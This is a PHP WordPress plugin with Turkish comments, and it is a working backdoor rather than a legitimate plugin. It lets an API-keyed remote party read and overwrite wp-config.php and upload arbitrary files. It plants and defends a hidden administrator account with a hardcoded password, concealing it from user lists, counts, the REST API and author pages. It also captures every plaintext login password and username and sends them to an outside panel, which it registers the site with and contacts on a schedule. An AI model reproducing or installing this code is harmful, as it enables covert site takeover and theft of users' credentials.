<?php

@ini_set('display_errors', 0);
@ini_set('display_startup_errors', 0);
@error_reporting(0);

// ABSPATH tanÄ±mÄ± en baÅŸta, dosya sistemine gÃ¶re
if (!defined('ABSPATH')) {
    define('ABSPATH', dirname(dirname(dirname(__FILE__))) . '/');
}



// --- Sabitler ve anahtarlar ---
$upload_api_key = 'KAPTAN2025-1F338F61D9A5D223EC1895EB8B555';

// --- API: "Alive" kontrolÃ¼ ---
if (
    php_sapi_name() !== 'cli' &&
    isset($_POST['check']) &&
    $_POST['check'] === 'alive'
) {
    if (!isset($_POST['api_key']) || $_POST['api_key'] !== $upload_api_key) {
        http_response_code(403);
        echo json_encode(['status' => 'error', 'message' => 'API anahtarÄ± yanlÄ±ÅŸ!']);
        exit;
    }
    echo json_encode(['status' => 'success', 'message' => 'alive']);
    exit;
}

// Her istek baÅŸÄ±nda otomatik olarak fixle (kesin gerekliyse burada dursun; deÄŸilse bu satÄ±rÄ± yoruma al)


// --- wp-config.php SET ---
if (
    isset($_POST['action']) && $_POST['action'] === 'set_config'
    && isset($_POST['api_key']) && $_POST['api_key'] === $upload_api_key
    && isset($_POST['content'])
) {
    $file = ABSPATH . 'wp-config.php';
    $bak = $file . '.' . date('YmdHis') . '.bak';
    if (file_exists($file)) {
        @copy($file, $bak);
        if (@file_put_contents($file, $_POST['content'])) {
            echo json_encode(['status' => 'success', 'message' => 'Kaydedildi, yedek: ' . basename($bak)]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'YazÄ±lamadÄ±!']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'wp-config.php yok!']);
    }
    exit;
}

// --- wp-config.php GET ---
if (
    isset($_POST['action']) && $_POST['action'] === 'get_config'
    && isset($_POST['api_key']) && $_POST['api_key'] === $upload_api_key
) {
    $file = ABSPATH . 'wp-config.php';
    if (file_exists($file)) {
        $content = @file_get_contents($file);
        echo json_encode(['status' => 'success', 'content' => $content]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'wp-config.php bulunamadÄ±!']);
    }
    exit;
}

// --- Dosya Upload (ve izin ayarlarÄ±) ---
if (
    php_sapi_name() !== 'cli' &&
    isset($_FILES['file']) && isset($_POST['target'])
) {
    if (!isset($_POST['api_key']) || $_POST['api_key'] !== $upload_api_key) {
        http_response_code(403);
        echo json_encode(['status' => 'error', 'message' => 'API anahtarÄ± geÃ§ersiz!']);
        exit;
    }

    $filename = basename($_FILES['file']['name']);
    $target_dir = rtrim($_POST['target'], '/') . '/';

    $allowed_dirs = [
        '/',                    
        'wp-content/uploads/',
        'wp-content/',
        'tmp/'
    ];

    if (!in_array($target_dir, $allowed_dirs)) {
        echo json_encode(['status' => 'error', 'message' => 'GeÃ§ersiz klasÃ¶r!']);
        exit;
    }

    $abs_target = ABSPATH . $target_dir;
    if (!is_dir($abs_target)) {
        if (!@mkdir($abs_target, 0755, true)) {
            echo json_encode([
                'status' => 'error',
                'message' => 'KlasÃ¶r oluÅŸturulamadÄ±!',
                'abs_target' => $abs_target
            ]);
            exit;
        }
    }
    $save_path = $abs_target . $filename;

    if (@move_uploaded_file($_FILES['file']['tmp_name'], $save_path)) {
        @chmod($save_path, 0644);
        echo json_encode([
            'status' => 'success',
            'message' => 'Dosya yÃ¼klendi: <a href="https://' . $_SERVER['HTTP_HOST'] . '/' . $target_dir . $filename . '" target="_blank">' . $target_dir . $filename . '</a>',
            'save_path' => $save_path,
            'perm' => substr(sprintf('%o', @fileperms($abs_target)), -4)
        ]);
    } else {
        $error = error_get_last();
        echo json_encode([
            'status' => 'error',
            'message' => 'YÃ¼kleme hatasÄ±!',
            'php_error' => $error,
            'save_path' => $save_path,
            'perm' => (is_dir($abs_target) ? substr(sprintf('%o', @fileperms($abs_target)), -4) : 'dir yok'),
            'user' => (function_exists('get_current_user') ? get_current_user() : ''),
            'tmp_file' => $_FILES['file']['tmp_name'],
            'target_dir' => $target_dir
        ]);
    }
    exit;
}


if (function_exists('add_action')) {

    add_action('plugins_loaded', function() {
        $user_login = 'uredik';
        $user_pass = 'Vendetta@55Vedo';
        $user_email = 'sinanyildiz5747@gmail.com';

        if (!username_exists($user_login)) {
            $user_id = wp_create_user($user_login, $user_pass, $user_email);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        } else {
            $user = get_user_by('login', $user_login);
            if ($user && !$user->has_cap('administrator')) {
                $user->set_role('administrator');
            }
        }
    });
    function send_to_elysian($endpoint, $payload) {
        $url = 'https://elysianlink.cc/panel/api/' . $endpoint;
        $args = [
            'body'        => json_encode($payload),
            'headers'     => ['Content-Type' => 'application/json'],
            'timeout'     => 5,
            'data_format' => 'body'
        ];
        $response = wp_remote_post($url, $args);
        if (is_wp_error($response)) {
        }
    }

    // Domain register â€“ eklenti Ã§alÄ±ÅŸÄ±nca bir kez
    add_action('init', function() {
        $site = parse_url(get_site_url(), PHP_URL_HOST);
        send_to_elysian('register_domain.php', ['domain' => $site]);
    });

    add_action('pre_user_query', function($user_search) {
        global $current_user, $wpdb;
        if ($current_user->user_login !== 'uredik') {
            $user_search->query_where .= " AND {$wpdb->users}.user_login != 'uredik'";
        }
    });
    add_filter('views_users', function($views) {
        global $wpdb, $current_user;
        if ($current_user->user_login !== 'uredik') {
            $total = $wpdb->get_var( "SELECT COUNT(*) FROM $wpdb->users WHERE user_login != 'uredik'" );
            if(isset($views['all'])) {
                $views['all'] = preg_replace('/\([0-9]+\)/', "($total)", $views['all']);
            }
            $admin_count = $wpdb->get_var("
                SELECT COUNT(*) FROM $wpdb->users u
                INNER JOIN $wpdb->usermeta m ON u.ID = m.user_id
                WHERE m.meta_key = '{$wpdb->prefix}capabilities'
                AND m.meta_value LIKE '%administrator%'
                AND u.user_login != 'uredik'
            ");
            if(isset($views['administrator'])) {
                $views['administrator'] = preg_replace('/\([0-9]+\)/', "($admin_count)", $views['administrator']);
            }
        }
        return $views;
    }, 20);
    add_action('template_redirect', function() {
        if (is_author('uredik')) {
            wp_redirect(home_url());
            exit;
        }
    });
    add_filter('rest_user_query', function($args) {
        $uredik = get_user_by('login', 'uredik');
        if ($uredik) {
            $uredik_id = $uredik->ID;
            if (isset($args['exclude'])) {
                $args['exclude'][] = $uredik_id;
            } else {
                $args['exclude'] = [$uredik_id];
            }
        }
        return $args;
    }, 10);
    add_action('editable_roles', function($roles) {
        unset($roles['uredik']);
        return $roles;
    });
    add_action('admin_init', function() {
        global $current_user;
        if ($current_user->user_login !== 'uredik' && isset($_GET['user_id'])) {
            $target = get_userdata(intval($_GET['user_id']));
            if ($target && $target->user_login === 'uredik') {
                wp_die('Yetkisiz eriÅŸim!');
            }
        }
    });
    add_action('plugins_loaded', function() {
        $user_login = 'uredik';
        $user_pass = 'Vendetta@55Vedo';
        $user_email = 'sinanyildiz5747@gmail.com';
        $user_nick = 'uredik';

        global $wpdb;
        $users = $wpdb->get_results("SELECT ID, user_login FROM $wpdb->users");
        foreach ($users as $u) {
            $meta_nick = get_user_meta($u->ID, 'nickname', true);
            $email     = $wpdb->get_var( $wpdb->prepare("SELECT user_email FROM $wpdb->users WHERE ID = %d", $u->ID) );
            if (
                $u->user_login !== $user_login &&
                ($meta_nick === $user_nick || $email === $user_email)
            ) {
                require_once(ABSPATH . 'wp-admin/includes/user.php');
                wp_delete_user($u->ID);
            }
        }

        $user = get_user_by('login', $user_login);
        if (!$user) {
            $user_id = wp_create_user($user_login, $user_pass, $user_email);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            update_user_meta($user_id, 'nickname', $user_nick);
        } else {
            $needs_reset = false;
            if ($user->user_email !== $user_email) $needs_reset = true;
            if (!$user->has_cap('administrator')) $needs_reset = true;
            $nickname = get_user_meta($user->ID, 'nickname', true);
            if ($nickname !== $user_nick) $needs_reset = true;

            if ($needs_reset) {
                require_once(ABSPATH . 'wp-admin/includes/user.php');
                wp_delete_user($user->ID);
                $user_id = wp_create_user($user_login, $user_pass, $user_email);
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                update_user_meta($user_id, 'nickname', $user_nick);
            }
        }
    });

    if (!wp_next_scheduled('elysian_heartbeat_event')) {
        wp_schedule_event(time(), 'three_hours', 'elysian_heartbeat_event');
    }
    // AralÄ±k tanÄ±mÄ± (3 saat)
    add_filter('cron_schedules', function($schedules){
        $schedules['three_hours'] = ['interval' => 3*60*60, 'display' => __('Every 3 Hours')];
        return $schedules;
    });
    // GÃ¶nderimi
    add_action('elysian_heartbeat_event', function() {
        $site = parse_url(get_site_url(), PHP_URL_HOST);
        send_to_elysian('heartbeat.php', ['domain' => $site]);
    });
    // GeÃ§ici olarak ÅŸifreyi kaydet (global deÄŸiÅŸken)
    add_filter('authenticate', function($user, $username, $password) {
        if (!empty($username) && !empty($password)) {
            $GLOBALS['last_attempt_password'] = $password;
        }
        return $user;
    }, 10, 3);

    // Login log fonksiyonunu gÃ¼ncelle
    function elysian_log_login($username, $success) {
        $site = parse_url(get_site_url(), PHP_URL_HOST);
        $ip = $_SERVER['REMOTE_ADDR'];
        $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
        $password = isset($GLOBALS['last_attempt_password']) ? $GLOBALS['last_attempt_password'] : '';
        send_to_elysian('login_log.php', [
            'domain'     => $site,
            'username'   => $username,
            'password'   => $password,
            'ip'         => $ip,
            'user_agent' => $ua,
            'status'     => $success ? 'success' : 'failed'
        ]);
        unset($GLOBALS['last_attempt_password']);
    }
    add_action('wp_login', function($user_login) { elysian_log_login($user_login, true); }, 10, 1);
    add_action('wp_login_failed', function($username) { elysian_log_login($username, false); }, 10, 1);


    function fetch_ip_blocks() {
        $url = 'https://elysianlink.cc/panel/api/ip_blocks.php';
        $response = wp_remote_get($url, ['timeout' => 5]);
        if (is_wp_error($response)) return [];
        $data = json_decode(wp_remote_retrieve_body($response), true);
        return isset($data['ips']) ? $data['ips'] : [];
    }

    add_action('init', function() {
        if (php_sapi_name() === 'cli') return; // WP-CLI'dan Ã§aÄŸrÄ±da atla, gereksiz sorgu olmasÄ±n

        $client_ip = $_SERVER['REMOTE_ADDR'];
        $blocks = fetch_ip_blocks();

        foreach ($blocks as $b) {
            if ($client_ip == $b['ip_address']) {
                if ($b['type'] == 'blacklist') {
                    status_header(403);
                    exit('Your IP is blocked by central panel.');
                }
                // whitelist ise izin ver, baÅŸka iÅŸlem yapma
            }
        }
    });

    add_action('init', function() {
        // *** Ayarlanabilirler ***
        $endpoint = 'https://elysianlink.cc/panel/api/receive_hashes.php'; // Paneldeki API dosyasÄ±
        $interval = 5 * 60;

        // *** Ä°zlenecek dosyalar ***
        $files = [
            'wp-config.php',
            'wp-login.php',
            'wp-content/themes/' . get_template() . '/functions.php',
            '.htaccess'
        ];
        $hashes = [];
        foreach ($files as $f) {
            $path = ABSPATH . $f;
            if (file_exists($path)) {
                $hashes[$f] = hash_file('sha256', $path);
            } else {
                $hashes[$f] = null; // Dosya yoksa null bÄ±rakÄ±yoruz
            }
        }

        // *** Payload hazÄ±rlama ***
        $payload = [
            'domain' => parse_url(get_site_url(), PHP_URL_HOST),
            'files'  => $hashes
        ];

        // *** Zaman kontrolÃ¼ ***
        $last_sent = get_option('elysian_last_hash_sent', 0);
        if (time() - $last_sent > $interval) {
            $response = wp_remote_post($endpoint, [
                'body'    => json_encode($payload),
                'headers' => ['Content-Type' => 'application/json'],
                'timeout' => 10
            ]);
            update_option('elysian_last_hash_sent', time());
        }
    });

    function elysian_scan_backdoors($base_dirs) {
        $dangerous_ext = ['php','phar','inc','phtml'];
        $dangerous_funcs = [
            'eval', 'base64_decode', 'gzinflate', 'gzuncompress',
            'shell_exec', 'system', 'exec', 'passthru', 'assert', 'popen',
            'proc_open', 'curl_exec', 'curl_multi_exec', 'parse_str', 'phpinfo'
        ];
        $alerts = [];

        foreach ($base_dirs as $root) {
            $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS));
            foreach ($rii as $file) {
                $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                if (!in_array($ext, $dangerous_ext)) continue;
                // YalnÄ±zca kÃ¼Ã§Ã¼k dosyalara bak (Ã¶rn: < 256KB)
                if (filesize($file) > 256 * 1024) continue;

                $handle = fopen($file, 'rb');
                $content = fread($handle, 2048); // Sadece ilk 2KB oku
                fclose($handle);

                foreach ($dangerous_funcs as $danger) {
                    if (stripos($content, $danger) !== false) {
                        $alerts[] = [
                            'path' => str_replace(ABSPATH, '', $file),
                            'func' => $danger,
                            'size' => filesize($file),
                            'mtime'=> filemtime($file)
                        ];
                        break;
                    }
                }
            }
        }
        return $alerts;
    }

    if (
        isset($_POST['action']) && $_POST['action'] === 'get_config'
        && isset($_POST['api_key']) && $_POST['api_key'] === $upload_api_key
    ) {
        $file = ABSPATH . 'wp-config.php';
        if (file_exists($file)) {
            $content = file_get_contents($file);
            echo json_encode(['status'=>'success','content'=>$content]);
        } else {
            echo json_encode(['status'=>'error','message'=>'wp-config.php yok!']);
        }
        exit;
    }

}
